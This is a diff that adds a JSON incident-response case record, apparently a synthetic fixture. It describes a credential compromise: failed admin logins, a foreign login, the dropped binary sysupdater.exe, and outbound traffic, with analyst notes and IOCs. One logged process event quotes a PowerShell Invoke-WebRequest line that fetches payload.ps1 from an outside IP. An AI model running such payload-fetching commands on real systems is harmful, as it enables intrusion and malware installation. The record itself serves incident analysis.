@@ -1,0 +1,71 @@
+{
+  "case_id": "INC-2025-1172",
+  "case_title": "Credential Compromise Leading to Malware Execution",
+  "case_summary": "Multiple failed logins followed by a successful admin session from a foreign IP, resulting in suspicious file downloads and outbound network traffic.",
+  "timeline": [
+    {
+      "timestamp": "2025-09-27T02:31:18Z",
+      "event_type": "failed_login",
+      "username": "admin",
+      "src_ip": "45.66.22.4",
+      "geo": "RU",
+      "status": "failure"
+    },
+    {
+      "timestamp": "2025-09-27T02:32:05Z",
+      "event_type": "failed_login",
+      "username": "admin",
+      "src_ip": "45.66.22.4",
+      "geo": "RU",
+      "status": "failure"
+    },
+    {
+      "timestamp": "2025-09-27T03:11:09Z",
+      "event_type": "login_success",
+      "username": "ops1",
+      "src_ip": "45.66.22.4",
+      "geo": "RU",
+      "status": "success"
+    },
+    {
+      "timestamp": "2025-09-27T03:13:44Z",
+      "event_type": "file_write",
+      "file_path": "C:\\\\Users\\\\ops1\\\\Downloads\\\\sysupdater.exe",
+      "process": "cmd.exe"
+    },
+    {
+      "timestamp": "2025-09-27T03:14:20Z",
+      "event_type": "network_connection",
+      "dst_ip": "198.51.100.24",
+      "protocol": "HTTPS",
+      "process": "sysupdater.exe"
+    },
+    {
+      "timestamp": "2025-09-27T03:16:58Z",
+      "event_type": "process_creation",
+      "process": "powershell.exe",
+      "cmdline": "Invoke-WebRequest -Uri http://198.51.100.24/payload.ps1"
+    },
+    {
+      "timestamp": "2025-09-27T03:17:03Z",
+      "event_type": "alert",
+      "alert_type": "malicious_network_activity",
+      "severity": "high",
+      "src_ip": "45.66.22.4"
+    }
+  ],
+  "affected_assets": [
+    {"hostname": "WIN-SRV-02", "user": "ops1", "department": "Operations"},
+    {"hostname": "DC-01", "user": "admin", "department": "IT"}
+  ],
+  "analyst_notes": [
+    "Sequence suggests credential stuffing followed by lateral movement.",
+    "Possible malware execution via downloaded binary and PowerShell call.",
+    "Outbound HTTPS traffic to known suspicious IP in IOC list."
+  ],
+  "ioc": [
+    {"type": "ip", "value": "198.51.100.24"},
+    {"type": "hash", "value": "ae33dfd2c1a7f3f8a2d99f1b7a2f78c9"},
+    {"type": "domain", "value": "malupdate-checker.com"}
+  ]
+}
